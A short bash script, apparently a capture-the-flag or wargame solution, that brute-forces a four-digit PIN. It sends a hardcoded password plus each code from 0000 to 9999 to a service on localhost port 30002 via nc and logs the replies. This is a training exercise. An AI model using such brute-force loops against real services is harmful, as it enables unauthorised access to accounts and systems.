#!/bin/bash

for i in $(seq -w 9999) ; do
    echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002 >> pass.txt &
done
